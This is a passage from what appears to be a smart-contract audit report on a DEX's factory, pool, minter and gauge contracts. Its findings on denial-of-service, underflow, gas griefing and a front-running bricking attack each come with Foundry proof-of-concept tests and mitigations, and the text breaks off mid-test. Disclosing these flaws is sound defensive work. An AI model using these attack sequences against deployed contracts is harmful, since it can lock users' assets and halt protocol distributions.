    function approve(address s, uint a) external returns(bool){ allowance[msg.sender][s]=a; return true; }
    function transfer(address to, uint a) external returns(bool){ require(balanceOf[msg.sender]>=a, "bal"); balanceOf[msg.sender]-=a; balanceOf[to]+=a; return true; }
    function transferFrom(address f, address t, uint a) external returns(bool){ require(balanceOf[f]>=a, "bal"); require(allowance[f][msg.sender]>=a, "allow"); allowance[f][msg.sender]-=a; balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

contract CLFactory_GM_DoS_Test is DSTest, ICLMintCallback, ICLFlashCallback, ICLSwapCallback {
    CLFactory factory;
    CLPool pool;
    address token0;
    address token1;

    function setUp() public {
        // Deploy tokens and fund test
        MockERC20 t0 = new MockERC20("T0","T0",18);
        MockERC20 t1 = new MockERC20("T1","T1",18);
        t0.mint(address(this), 1e24);
        t1.mint(address(this), 1e24);

        // Deploy pool implementation and factory
        CLPool impl = new CLPool();
        factory = new CLFactory(address(impl));

        // Create pool (tickSpacing pre-enabled by factory constructor)
        address p = factory.createPool(address(t0), address(t1), 100, TickMath.getSqrtRatioAtTick(0));
        pool = CLPool(p);
        token0 = pool.token0();
        token1 = pool.token1();

        // Add minimal liquidity
        pool.mint(address(this), -1000, 1000, 1e12, bytes(""));
    }

    // Mint callback pays required amounts to the pool
    function uniswapV3MintCallback(uint256 amount0, uint256 amount1, bytes calldata) external override {
        require(msg.sender == address(pool), "mint cb");
        if (amount0 > 0) TransferHelper.safeTransfer(token0, msg.sender, amount0);
        if (amount1 > 0) TransferHelper.safeTransfer(token1, msg.sender, amount1);
    }

    function uniswapV3SwapCallback(int256, int256, bytes calldata) external override {}

    // Flash callback repays amount + fee (amounts encoded in data)
    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external override {
        require(msg.sender == address(pool), "flash cb");
        (uint256 amt0, uint256 amt1) = abi.decode(data, (uint256, uint256));
        if (amt0 > 0) TransferHelper.safeTransfer(token0, msg.sender, amt0 + fee0);
        if (amt1 > 0) TransferHelper.safeTransfer(token1, msg.sender, amt1 + fee1);
    }

    function test_DoS_flash_due_to_reverting_gaugeManager() public {
        // Set a malicious gaugeManager that reverts in isGaugeAliveForPool
        RevertingGaugeManager gm = new RevertingGaugeManager();
        factory.setGaugeManager(address(gm)); // factory owner is this test by default

        // Any flash/swap now reverts because CLFactory.getProtocolFee -> gaugeManager.isGaugeAliveForPool reverts
        bool reverted = false;
        try pool.flash(address(this), 1e18, 0, abi.encode(uint256(1e18), uint256(0))) {
            // should not reach
        } catch {
            reverted = true;
        }
        assertTrue(reverted);
    }
}


## Suggested Mitigation
Harden the gauge liveness check in both getProtocolFee and getUnstakedFee:
- If gaugeManager == address(0) or has no code, treat as not alive and continue with safe defaults.
- Replace the direct high-level call with ExcessivelySafeStaticCall (already linked) or a low-level staticcall to IGaugeManager.isGaugeAliveForPool(pool). Decode only on success and with sufficient return data; otherwise default to alive=false.
- For getProtocolFee: if alive==true return 0; else query protocolFeeModule via safe staticcall and fall back to defaultProtocolFee on failure.
- For getUnstakedFee: if alive==false return 0; else query unstakedFeeModule via safe staticcall and fall back to defaultUnstakedFee on failure.
This mirrors the defensive pattern already used for fee modules and eliminates a single-point DoS from gaugeManager reverts.





 **Derived From** : Rebase + team share can exceed emission and revert, halting weekly distributions

## [M-48]. Emission split underflows in MinterUpgradeable.update_period() when REBASEMAX + teamRate > 100% (DoS of weekly emissions)

## Derived From Pattern/Invariant
Rebase + team share can exceed emission and revert, halting weekly distributions

## Exploit Type
AccountingInvariantViolation

## Location
MinterUpgradeable.update_period

## Minimim Privilege Required
RequiresRole

## Description
In MinterUpgradeable.update_period(), the weekly emission is split into rebase, team, and gauge portions:

uint _rebase = calculate_rebase(_emission);
uint _teamEmissions = _emission * teamRate / MAX_BPS;
uint _gauge = _emission - _rebase - _teamEmissions;

calculate_rebase caps rebase share at REBASEMAX bps of weekly emission if lockedShare ≥ REBASEMAX, otherwise uses lockedShare. There is no guard that REBASEMAX + teamRate ≤ MAX_BPS. If governance (team) sets REBASEMAX high enough such that REBASEMAX + teamRate > MAX_BPS (e.g., REBASEMAX=10000 and teamRate>0, or generally REBASEMAX=9900 and teamRate=500), then when lockedShare ≥ REBASEMAX the code computes _rebase = _emission * REBASEMAX / MAX_BPS and _gauge underflows: _emission - _rebase - _teamEmissions < 0, causing a checked underflow revert. The revert occurs before any mint/transfer, permanently blocking weekly emissions and rebases until parameters are changed.

## Impact
Weekly emissions and ve rebases cannot be processed (DoS of protocol distribution). Gauges and voters stop receiving new rewards until params are corrected.

## Proof of Concept
1) Team sets REBASEMAX to 10000 (100%) while teamRate > 0 (default 5%).
2) Ensure ve lockedShare ≥ REBASEMAX (e.g., mint all initial HYBR to the ve contract so its share is 100%).
3) Any EOA calls update_period() after the epoch boundary. The function calculates _rebase == _emission and a non-zero _teamEmissions, then computes _gauge = _emission - _rebase - _teamEmissions which underflows and reverts. Emissions remain stuck until REBASEMAX and/or teamRate are fixed.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {MinterUpgradeable} from "ve33/contracts/MinterUpgradeable.sol";
import {IHybra} from "ve33/contracts/interfaces/IHybra.sol";

contract MockHybr is IHybra {
    string public constant name = "HYBR";
    string public constant symbol = "HYBR";
    uint8 public constant decimals = 18;
    uint private _total;
    mapping(address => uint) public override balanceOf;
    mapping(address => mapping(address => uint)) public allowance;

    function totalSupply() external view override returns (uint) { return _total; }
    function approve(address spender, uint value) external override returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }
    function transfer(address to, uint value) external override returns (bool) {
        require(balanceOf[msg.sender] >= value, "bal");
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }
    function transferFrom(address from, address to, uint value) external override returns (bool) {
        require(allowance[from][msg.sender] >= value, "allow");
        require(balanceOf[from] >= value, "bal");
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
    function mint(address to, uint value) external override returns (bool) {
        _total += value; balanceOf[to] += value; return true;
    }
    function minter() external pure override returns (address) { return address(0); }
    function burn(uint) external pure override returns (bool) { return true; }
    function burnFrom(address, uint) external pure override returns (bool) { return true; }
}

contract MockVE {
    address private _token;
    function setToken(address t) external { _token = t; }
    function token() external view returns (address) { return _token; }
}

contract MockRewardsDistributor {
    function checkpoint_token() external { /* no-op for test */ }
}

contract MockGaugeManager {
    function notifyRewardAmount(uint256) external { /* no-op for test */ }
}

contract MinterUnderflowTest is Test {
    MinterUpgradeable minter;
    MockHybr hybr;
    MockVE ve;
    MockGaugeManager gm;
    MockRewardsDistributor rd;

    function setUp() public {
        hybr = new MockHybr();
        ve = new MockVE();
        ve.setToken(address(hybr));
        gm = new MockGaugeManager();
        rd = new MockRewardsDistributor();

        minter = new MinterUpgradeable();
        minter.initialize(address(gm), address(ve), address(rd));

        // Give HYBR totalSupply > 0 and make ve hold 100% so lockedShare == 100%
        hybr.mint(address(ve), 1_000 ether);

        // Finish minter init window so update_period is callable
        address[] memory claimants = new address[](0);
        uint[] memory amounts = new uint[](0);
        minter._initialize(claimants, amounts, 0);

        // Set REBASEMAX to 100% and keep default teamRate = 5%
        minter.setRebase(10_000);

        // Move to next epoch
        vm.warp(block.timestamp + minter.WEEK() + 1);
    }

    function test_DoS_RebasePlusTeamExceedsEmission() public {
        address attacker = address(0xBEEF);
        vm.startPrank(attacker);
        vm.expectRevert();
        minter.update_period();
        vm.stopPrank();
    }
}


## Suggested Mitigation
Clamp the split in bps before applying amounts to guarantee non-negativity. For example:

- Compute rebaseBps = min(lockedShareBps, REBASEMAX) and teamBps = teamRate.
- Require(rebaseBps + teamBps <= MAX_BPS) or instead set rebaseBps = MAX_BPS - teamBps when overflow would occur.
- Derive amounts from bps safely: _gauge = _emission * (MAX_BPS - rebaseBps - teamBps) / MAX_BPS; _rebase = _emission * rebaseBps / MAX_BPS; _teamEmissions = _emission * teamBps / MAX_BPS.

Additionally, add a setter guard: require(_rebase <= MAX_BPS - teamRate) when setRebase/setTeamRate are called, or validate the tuple on update to prevent bricking.





 **Derived From** : _teamEmissions + _rebase + _gauge == _emission

## [M-49]. Division-by-zero in calculate_rebase when HYBR totalSupply == 0 bricks update_period

## Derived From Pattern/Invariant
_teamEmissions + _rebase + _gauge == _emission

## Exploit Type
IntegerMath

## Location
MinterUpgradeable.update_period

## Minimim Privilege Required
Permissionless

## Description
MinterUpgradeable.calculate_rebase computes lockedShare = (_veTotal) * MAX_BPS / _hybrTotal, where _hybrTotal = HYBR.totalSupply(). When totalSupply == 0 (e.g., misconfigured bootstrap where no initial mint happened but _initialize cleared the initializer), update_period calls calculate_rebase and division by zero reverts. This prevents the epoch emission split (team/rebase/gauges), violating the arithmetic rollover invariant.

## Impact
Calling update_period when HYBR.totalSupply() == 0 reverts due to division by zero in calculate_rebase, causing a protocol-wide DoS of the weekly emission process. This prevents team/rebase/gauge distribution for that epoch and also breaks downstream flows (e.g., GaugeManager.distribute* paths that call minter.update_period). The DoS persists until any positive HYBR supply exists.

## Proof of Concept
Steps to reproduce:
1) Deploy HYBR with zero supply (no initial mint). Deploy a ve mock that returns this HYBR as its token.
2) Deploy and initialize MinterUpgradeable with the mock GaugeManager and RewardsDistributor.
3) Call MinterUpgradeable._initialize([], [], 0) so _initializer is cleared without minting any HYBR.
4) Advance time to the next epoch and call update_period. It reverts because calculate_rebase divides by HYBR.totalSupply()==0.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {MinterUpgradeable} from "ve33/contracts/MinterUpgradeable.sol";
import {IGaugeManager} from "ve33/contracts/interfaces/IGaugeManager.sol";
import {IRewardsDistributor} from "ve33/contracts/interfaces/IRewardsDistributor.sol";

contract MockVE {
    address public tokenAddr;
    constructor(address t) { tokenAddr = t; }
    function token() external view returns (address) { return tokenAddr; }
}

contract MockGaugeManager is IGaugeManager {
    function notifyRewardAmount(uint256) external override {}
    function isGaugeAliveForPool(address) external pure override returns (bool) { return true; }
    function gauges(address) external pure override returns (address) { return address(0); }
    function isGauge(address) external pure override returns (bool) { return true; }
    function poolForGauge(address) external pure override returns (address) { return address(0); }
}

contract MockRewardsDistributor is IRewardsDistributor {
    function checkpoint_token() external override {}
    function voting_escrow() external pure override returns (address) { return address(0); }
    function claimable(uint) external pure override returns (uint) { return 0; }
    function claim(uint) external pure override returns (uint) { return 0; }
}

contract ZeroSupplyHYBR {
    uint public totalSupply; // 0 by default
    mapping(address => uint) public balanceOf;
    function approve(address, uint) external pure returns (bool) { return true; }
    function transfer(address, uint) external pure returns (bool) { return true; }
    function transferFrom(address,address,uint) external pure returns (bool) { return true; }
    function mint(address, uint) external pure returns (bool) { return true; }
    function minter() external pure returns (address) { return address(0); }
    function burn(uint) external pure returns (bool) { return true; }
    function burnFrom(address, uint) external pure returns (bool) { return true; }
}

contract MinterZeroSupplyDivTest is Test {
    MinterUpgradeable minter;
    ZeroSupplyHYBR token;
    MockVE ve;
    MockGaugeManager gm;
    MockRewardsDistributor rd;

    function setUp() public {
        token = new ZeroSupplyHYBR();
        ve = new MockVE(address(token));
        gm = new MockGaugeManager();
        rd = new MockRewardsDistributor();

        minter = new MinterUpgradeable();
        minter.initialize(address(gm), address(ve), address(rd));

        // finalize initializer without minting any HYBR
        address[] memory claimants = new address[](0);
        uint[] memory amounts = new uint[](0);
        minter._initialize(claimants, amounts, 0);

        // move to next epoch
        uint WEEK = minter.WEEK();
        vm.warp((block.timestamp / WEEK) * WEEK + WEEK + 1);
    }

    function testUpdatePeriodRevertsOnZeroSupply() public {
        vm.expectRevert();
        minter.update_period();
    }
}


## Suggested Mitigation
Add a zero-supply guard in calculate_rebase to avoid division by zero. Example:

function calculate_rebase(uint _weeklyMint) public view returns (uint) {
    uint _hybrTotal = _hybr.totalSupply();
    if (_hybrTotal == 0) return 0; // no rebase when no supply
    uint _veTotal = _hybr.balanceOf(address(_ve));
    uint lockedShare = (_veTotal * MAX_BPS) / _hybrTotal;
    uint capped = lockedShare >= REBASEMAX ? REBASEMAX : lockedShare;
    return (_weeklyMint * capped) / MAX_BPS;
}

Additionally, enforce in deployment/init scripts that a non-zero initial HYBR supply is minted before calling MinterUpgradeable._initialize (which clears the initializer and enables emissions). As an alternative, compute rebase after minting the epoch emission to ensure totalSupply > 0 on first run, but the simple zero-guard is safer and preserves current economics.





 **Derived From** : Append-only allPools array causes storage bloat and degrades fee collection over time

## [M-50]. Gas grief: permissionless pool spam bloats CLFactory.allPools → collectAllProtocolFees becomes impractical/DoS over time

## Derived From Pattern/Invariant
Append-only allPools array causes storage bloat and degrades fee collection over time

## Exploit Type
GasGriefBlockLimit

## Location
CLFactory.createPool

## Minimim Privilege Required
Permissionless

## Description
CLFactory.createPool is permissionless and appends each new pool to allPools without any cap or pruning. There is no requirement that tokenA/tokenB are real ERC20s, so an attacker can spam thousands of pools using arbitrary addresses to grow allPools unbounded. Later, the owner’s collectAllProtocolFees iterates over allPools, performing an external call per pool: as the array grows, gas cost scales linearly and eventually exceeds block gas limits, making routine fee sweeps impractical (GasGriefBlockLimit / DoS). Vulnerable snippets: in CLFactory.createPool: allPools.push(pool); and in CLFactory.collectAllProtocolFees: for (uint256 i = 0; i < allPools.length; i++) { CLPool(allPools[i]).collectProtocolFees(msg.sender); }

## Impact
As the allPools array grows without bound, owner-only collectAllProtocolFees becomes increasingly expensive and can eventually exceed block gas limits, making protocol-wide fee sweeps impractical. While fees can still be collected per-pool, this creates an operational DoS, increases costs, and degrades treasury operations. No direct asset loss occurs, but availability and efficiency of fee collection are significantly impacted.

## Proof of Concept
Attack outline:
- Anyone can call createPool with arbitrary non-zero addresses for tokenA/tokenB, and with any enabled tickSpacing; there is no check that tokens are real ERC-20s.
- Each call appends a new pool to allPools. Attacker repeats thousands of times to bloat allPools.
- Later, the owner calls collectAllProtocolFees(). This function iterates over allPools and performs one external call per pool. Gas scales linearly with allPools.length. Beyond a threshold, the call will run out of gas and fail, DoSing the batch fee collection.
- The owner can still call collectProtocolFees(pool) per pool, but batching is no longer feasible, increasing operational overhead.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {CLFactory} from "cl/contracts/core/CLFactory.sol";
import {CLPool} from "cl/contracts/core/CLPool.sol";
import {TickMath} from "cl/contracts/core/libraries/TickMath.sol";

// Minimal, deterministic test demonstrating linear gas growth and failure under tight gas budget
contract CollectAll_DoS_Test is Test {
    CLFactory factory;
    CLPool poolImpl;

    function setUp() public {
        // Deploy the pool implementation and factory; this contract becomes factory owner
        poolImpl = new CLPool();
        factory = new CLFactory(address(poolImpl));
        // default enabled tickSpacings exist from constructor
    }

    function _spamCreate(uint256 n, int24 tickSpacing) internal {
        // Create n distinct pools with arbitrary EOA addresses as tokens
        // Note: tokens are not validated as ERC20s by the factory
        uint160 base = 0x1000;
        uint160 sqrtP = TickMath.getSqrtRatioAtTick(0);
        for (uint256 i = 0; i < n; i++) {
            address tokenA = address(uint160(base + 2 * i + 1));
            address tokenB = address(uint160(base + 2 * i + 2));
            factory.createPool(tokenA, tokenB, tickSpacing, uint160(sqrtP));
        }
    }

    function _gasForCollectAll() internal returns (uint256 used) {
        uint256 g0 = gasleft();
        factory.collectAllProtocolFees(); // onlyOwner; owner == address(this)
        used = g0 - gasleft();
    }

    function test_collectAll_gas_scales_and_fails_under_budget() public {
        // Baseline with 0 pools
        uint256 g0 = _gasForCollectAll();

        // Create 200 pools and measure gas increase
        _spamCreate(200, 50);
        uint256 g1 = _gasForCollectAll();
        assertGt(g1, g0, "gas should increase after 200 pools");

        // Create 400 more (total 600) and measure again
        _spamCreate(400, 50);
        uint256 g2 = _gasForCollectAll();
        assertGt(g2, g1, "gas should increase after 600 pools");

        // Demonstrate failure under tight gas budget
        // With hundreds of pools, 150k gas is insufficient for a full sweep
        (bool ok, ) = address(factory).call{gas: 150_000}(abi.encodeWithSelector(factory.collectAllProtocolFees.selector));
        assertTrue(!ok, "collectAllProtocolFees should fail with large allPools under 150k gas");
    }
}


## Suggested Mitigation
- Replace the unbounded loop with a paginated/batched variant so the owner can sweep in chunks within gas limits:

  function collectProtocolFees(uint256 start, uint256 end, address recipient) external {
      require(msg.sender == owner);
      require(start < end && end <= allPools.length);
      for (uint256 i = start; i < end; i++) {
          CLPool(allPools[i]).collectProtocolFees(recipient);
      }
  }

  Optionally deprecate or remove collectAllProtocolFees to avoid accidental DoS.

- Consider adding basic token sanity checks in createPool to reduce spam surface area:
  - require(token0.code.length > 0 && token1.code.length > 0);
  - (optional) lightweight ERC20 interface checks via staticcall to decimals() or totalSupply() with data length validation.
  - (optional) introduce a token whitelist or an allowlist gate if aligned with protocol design.

- Consider a pruning mechanism or index management (e.g., maintain a separate enumerable set of active pools) so dead/abandoned pools are not iterated during sweeps.





 **Derived From** : createPool allows zero/incorrect gaugeManager, permanently bricking gauge setup

## [M-51]. Anyone can front‑run CLFactory.createPool before gaugeManager is set and permanently brick gauge attachment for that pair/spacing

## Derived From Pattern/Invariant
createPool allows zero/incorrect gaugeManager, permanently bricking gauge setup

## Exploit Type
UpgradeabilityInitializerSafety

## Location
CLFactory.createPool

## Minimim Privilege Required
Permissionless

## Description
CLFactory.createPool forwards the current factory.gaugeManager into the cloned pool during CLPool.initialize without checking it’s set. If governance hasn’t called setGaugeManager yet (or it’s pointed to a wrong address), the pool stores that zero/incorrect gaugeManager permanently. Later, CLPool.setGaugeAndPositionManager requires msg.sender == stored gaugeManager and gauge == address(0), which can never be satisfied if the stored gaugeManager is address(0) or wrong. Because CLFactory.getPool[...] is populated for both token orders, governance cannot redeploy a fresh canonical pool for that pair/tickSpacing to fix it. Additionally, while factory.gaugeManager is unset, getUnstakedFee()/getProtocolFee() will revert (calling gaugeManager.isGaugeAliveForPool on address(0)), breaking swaps/flash that consult these fees. Vulnerable snippet:

CLFactory.createPool:
  pool = Clones.cloneDeterministic(...)
  CLPool(pool).initialize({
      _factory: address(this),
      _token0: token0,
      _token1: token1,
      _tickSpacing: tickSpacing,
      _gaugeManager: address(gaugeManager), // may be zero/incorrect
      _sqrtPriceX96: sqrtPriceX96
  });

CLPool.setGaugeAndPositionManager:
  function setGaugeAndPositionManager(address _gauge, address _nft) external lock {
      require(msg.sender == gaugeManager && gauge == address(0)); // impossible if stored gaugeManager == 0
      ...
  }

## Impact
If governance has not configured factory.gaugeManager yet, any address can create the canonical pool for a pair/tickSpacing with _gaugeManager=0 baked into the pool. That pool can never have its gauge attached because CLPool.setGaugeAndPositionManager requires msg.sender == stored gaugeManager and gauge == 0. Since CLFactory.getPool is set both directions, governance cannot redeploy the canonical pool to fix it. While factory.gaugeManager remains unset, CLFactory.getUnstakedFee/getProtocolFee revert for any pool, which causes swap/flash to revert in CLPool. After governance later sets gaugeManager on the factory, swap/flash work again but the affected pool remains permanently unable to attach a gauge, diverting fees per the ‘inactive gauge’ path and breaking staking for that market.

## Proof of Concept
1) Deploy CLFactory with a valid CLPool implementation; do not call setGaugeManager yet (factory.gaugeManager == 0).
2) Attacker calls createPool(tokenA, tokenB, tickSpacing, sqrtPriceX96): the pool initializes with _gaugeManager=0.
3) Any attempt to call setGaugeAndPositionManager on that pool reverts forever because require(msg.sender == gaugeManager && gauge == 0) can never satisfy msg.sender == 0.
4) Governance sets factory.gaugeManager later; the pool remains bricked since it stored 0 at init and has no path to update it.
5) Because getPool is populated for both token orders, a new canonical pool for the same pair/tickSpacing cannot be created.
6) While factory.gaugeManager is unset, calls to factory.getUnstakedFee/pool.unstakedFee and factory.getProtocolFee/pool.protocolFee revert due to an external call to address(0), causing swap/flash to revert in any pool that calls these during fee calculation.

## Proof of Code
pragma solidity 0.8.13;
import "forge-std/Test.sol";
import {CLFactory} from "cl/contracts/core/CLFactory.sol";
import {CLPool} from "cl/contracts/core/CLPool.sol";

contract DummyToken { string public name; string public symbol; uint8 public decimals; constructor(string memory n, string memory s, uint8 d){ name=n; symbol=s; decimals=d; } }

contract MockGaugeManager { function isGaugeAliveForPool(address) external pure returns (bool) { return false; } }

contract CreatePoolGaugeInitOrderTest is Test {
    function test_gaugeManagerUnset_BricksPoolAndFeeGetters() public {
        // Deploy pool implementation and factory; this test contract is factory owner
        CLPool impl = new CLPool();
        CLFactory factory = new CLFactory(address(impl));

        // Sanity: gaugeManager is unset
        assertEq(address(factory.gaugeManager()), address(0));

        // Deploy two dummy ERC20-like tokens (only addresses are used by createPool)
        DummyToken t0 = new DummyToken("T0","T0",18);
        DummyToken t1 = new DummyToken("T1","T1",18);

        uint160 sqrtPriceX96 = uint160(1) << 96; // ~1:1
        int24 spacing = 50; // enabled by factory constructor

        // Anyone can create pool before gaugeManager is configured
        address pool = factory.createPool(address(t0), address(t1), spacing, sqrtPriceX96);
        assertTrue(pool != address(0));

        // While factory.gaugeManager is unset, fee getters revert (breaks swap/flash)
        vm.expectRevert(); factory.getUnstakedFee(pool);
        vm.expectRevert(); factory.getProtocolFee(pool);

        // Pool stored gaugeManager=0, so setting gauge is impossible forever
        vm.expectRevert(); CLPool(pool).setGaugeAndPositionManager(address(0x1234), address(0x5678));

        // Later governance sets a real gaugeManager on the factory
        MockGaugeManager mgm = new MockGaugeManager();
        factory.setGaugeManager(address(mgm));

        // After set, fee getters no longer revert
        // getUnstakedFee returns 0 when gauge is not alive
        assertEq(factory.getUnstakedFee(pool), 0);
        // getProtocolFee returns defaultProtocolFee when gauge is not alive
        assertEq(factory.getProtocolFee(pool), factory.defaultProtocolFee());

        // But the pool remains bricked: only stored gaugeManager (0) could call setGaugeAndPositionManager
        vm.prank(address(mgm));
        vm.expectRevert(); CLPool(pool).setGaugeAndPositionManager(address(0x1111), address(0x2222));

        // Canonical slot burned: cannot redeploy same pair/spacing in either order
        vm.expectRevert(); factory.createPool(address(t1), address(t0), spacing, sqrtPriceX96);

        // Gauge is permanently unset
        assertEq(CLPool(pool).gauge(), address(0));
    }
}


## Suggested Mitigation
Harden both factory and pool wiring paths:
- In CLFactory.createPool, require the gaugeManager to be configured before cloning/initializing pools: require(address(gaugeManager) != address(0), "GM_NOT_SET"). This prevents permanently bricked pools.
- In CLFactory.getUnstakedFee and getProtocolFee, guard against an unset gaugeManager to avoid reverts during early configuration, e.g.:
  - if (address(gaugeManager) == address(0)) return default values (0 or defaults consistent with your fee model; for protocolFee return defaultProtocolFee; for unstakedFee consider returning defaultUnstakedFee or 0 per spec).
- Optional resilience: modify CLPool.setGaugeAndPositionManager to accept the current factory.gaugeManager (e.g., require msg.sender == ICLFactory(factory).gaugeManager()) or add a one-time factory-only function to update the stored gaugeManager when it is zero and before a gauge is set. This provides a recovery path if deployment order is ever incorrect.





 **Derived From** : rHYBR external call in withdraw can brick withdrawals (no fallback)

## [H-52]. GaugeCL.withdraw is griefable: untrusted rHYBR callback can DoS NFT exits (no try/catch, no skip-claim path)

## Derived From Pattern/Invariant
rHYBR external call in withdraw can brick withdrawals (no fallback)

## Exploit Type
Dos

## Location
GaugeCL.withdraw

## Minimim Privilege Required
RequiresRole

## Description
GaugeCL.withdraw() unconditionally calls _getReward(), which makes two external calls to rHYBR: depostionEmissionsToken(amount) and redeemFor(amount, redeemType, account). If rHYBR reverts/pauses/misconfigures either call, the entire withdraw() reverts before returning the staked NFT, hard-bricking user exits. There is no try/catch or alternative withdrawWithoutClaim path. Vulnerable flow: function _getReward(...) { _updateRewards(...); uint256 rewardAmount = rewards[tokenId]; if (rewardAmount > 0) { delete rewards[tokenId]; rewardToken.safeApprove(rHYBR, rewardAmount); IRHYBR(rHYBR).depostionEmissionsToken(rewardAmount); IRHYBR(rHYBR).redeemFor(rewardAmount, redeemType, account); } } and in withdraw(): _getReward(...); ... safeTransferFrom(address(this), msg.sender, tokenId). Any revert inside rHYBR permanently blocks withdrawals until rHYBR is fixed, giving a grief vector to that dependency and violating safe-exit in paused/degraded states.

## Impact
Any revert in the external rHYBR calls inside _getReward causes withdraw() to revert, preventing users from recovering their staked Uniswap v3 position NFTs. Since rHYBR is an external dependency and immutable in the gauge, a pause/misconfiguration/bug in rHYBR will block all withdrawals for positions with non-zero accrued rewards, effectively locking user assets until rHYBR is fixed or the system is redeployed. This is a direct loss of custody/liveness for user assets.

## Proof of Concept
Revised PoC (steps)
1) User stakes a CL NFT into GaugeCL and rewards start accruing.
2) rHYBR (or its admin) transitions to a reverting state (e.g., redeemFor always reverts).
3) User calls withdraw(tokenId, redeemType).
4) withdraw() calls _getReward() which calls IRHYBR.depostionEmissionsToken and then IRHYBR.redeemFor.
5) IRHYBR.redeemFor reverts; the entire withdraw() reverts before the NFT transfer back to the user.
6) NFT remains custodied by the gauge; user cannot exit until rHYBR resumes normal behavior or code is changed.

Why this is unavoidable for users:
- _getReward is unconditionally invoked in withdraw; there is no try/catch and no withdraw-without-claim path. Thus any revert in rHYBR bricks exits.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeCL} from "../contracts/CLGauge/GaugeCL.sol";
import {INonfungiblePositionManager} from "../contracts/CLGauge/interface/INonfungiblePositionManager.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

// Minimal ERC20 to act as reward token
contract MockERC20 {
    string public name = "T"; string public symbol = "T"; uint8 public decimals = 18;
    mapping(address=>uint256) public balanceOf; mapping(address=>mapping(address=>uint256)) public allowance;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function approve(address sp, uint256 amt) external returns (bool){ allowance[msg.sender][sp] = amt; return true; }
    function transfer(address to, uint256 amt) external returns (bool){ require(balanceOf[msg.sender] >= amt, "bal"); balanceOf[msg.sender]-=amt; balanceOf[to]+=amt; return true; }
    function transferFrom(address f,address t,uint256 a) external returns(bool){ uint256 al=allowance[f][msg.sender]; require(al>=a, "allow"); if(al!=type(uint256).max) allowance[f][msg.sender]=al-a; require(balanceOf[f]>=a, "bal"); balanceOf[f]-=a; balanceOf[t]+=a; return true; }
}

// Malicious rHYBR mock that reverts on redeemFor
contract MaliciousRHYBR {
    function depostionEmissionsToken(uint256) external {}
    function redeemFor(uint256, uint8, address) external pure { revert("grief"); }
}

// Minimal CL Factory stub for pool check
contract MockCLFactory {
    address public pool; constructor(address _pool){ pool=_pool; }
    function getPool(address, address, int24) external view returns(address){ return pool; }
}

// Minimal CL Pool stub satisfying GaugeCL calls
contract MockCLPool {
    address public token0; address public token1;
    uint256 internal _rewardReserve = 1e24;
    uint256 internal _lastUpdated; uint256 internal _rewardGrowthGlobalX128; uint256 internal _stakedLiquidity = 1e12;
    constructor(address _t0,address _t1){ token0=_t0; token1=_t1; _lastUpdated = block.timestamp - 100; }
    function updateRewardsGrowthGlobal() external {}
    function getRewardGrowthInside(int24, int24, uint256 rewardGrowthGlobalX128) external pure returns (uint256){ return rewardGrowthGlobalX128 + 1e12; }
    function stake(int128, int24, int24, bool) external {}
    function rewardReserve() external view returns(uint256){ return _rewardReserve; }
    function lastUpdated() external view returns(uint256){ return _lastUpdated; }
    function rewardGrowthGlobalX128() external view returns(uint256){ return _rewardGrowthGlobalX128; }
    function stakedLiquidity() external view returns(uint256){ return _stakedLiquidity; }
    function syncReward(uint256 rr, uint256 reserve, uint256) external { _rewardReserve = reserve; _rewardGrowthGlobalX128 += rr; }
    function rollover() external pure returns(uint256){ return 0; }
    function collectFees() external {}
    function gaugeFees() external view returns(uint256,uint256){ return (0,0); }
}

// Minimal NFPM stub
contract MockNFPM {
    struct Pos { address owner; address token0; address token1; int24 tickSpacing; int24 tickLower; int24 tickUpper; uint128 liquidity; }
    mapping(uint256=>Pos) public P; address public clFactory;
    function setFactory(address f) external { clFactory = f; }
    function mintPosition(uint256 id, address owner, address t0, address t1, int24 spacing, int24 tl, int24 tu, uint128 liq) external { P[id] = Pos(owner,t0,t1,spacing,tl,tu,liq); }
    function ownerOf(uint256 id) public view returns(address){ return P[id].owner; }
    function safeTransferFrom(address from, address to, uint256 id) external {
        require(P[id].owner==from, "!owner"); P[id].owner=to;
        if(to.code.length>0){ try IERC721Receiver(to).onERC721Received(msg.sender, from, id, "") returns(bytes4 sel){ require(sel == IERC721Receiver.onERC721Received.selector, "!erc721"); } catch { revert("!erc721 cb"); } }
    }
    function collect(INonfungiblePositionManager.CollectParams calldata) external pure returns (uint256,uint256){ return (0,0); }
    function factory() external view returns(address){ return clFactory; }
    function positions(uint256 id) external view returns (
        uint96, address, address token0, address token1, int24 tickSpacing, int24 tickLower, int24 tickUpper, uint128 liquidity, uint256, uint256, uint128, uint128
    ){
        Pos memory x = P[id]; return (0,address(0),x.token0,x.token1,x.tickSpacing,x.tickLower,x.tickUpper,x.liquidity,0,0,0,0);
    }
}

contract GaugeCL_RevertRHYBR_WithdrawDoS_Test is Test {
    MockERC20 reward; MaliciousRHYBR mal; MockCLPool pool; MockNFPM nfpm; MockCLFactory fac; GaugeCL gauge;
    address DISTRIBUTION;

    function setUp() public {
        reward = new MockERC20();
        mal = new MaliciousRHYBR();
        pool = new MockCLPool(address(0xA1), address(0xA2));
        nfpm = new MockNFPM();
        fac = new MockCLFactory(address(pool));
        nfpm.setFactory(address(fac));
        DISTRIBUTION = address(this);
        gauge = new GaugeCL(address(reward), address(mal), address(0xBEEF), address(pool), DISTRIBUTION, address(0), address(0), false, address(nfpm), address(0));

        // Mint and deposit a position
        uint256 tokenId = 1;
        nfpm.mintPosition(tokenId, address(this), address(0xA1), address(0xA2), int24(60), int24(-600), int24(600), uint128(1e9));
        gauge.deposit(tokenId);

        // Fund and start rewards
        reward.mint(DISTRIBUTION, 1e24);
        reward.approve(address(gauge), 1e24);
        gauge.notifyRewardAmount(address(reward), 1e21);
        vm.warp(block.timestamp + 3600);
    }

    function testWithdrawRevertsAndNFTRemainsStuckWhenRHYBRReverts() public {
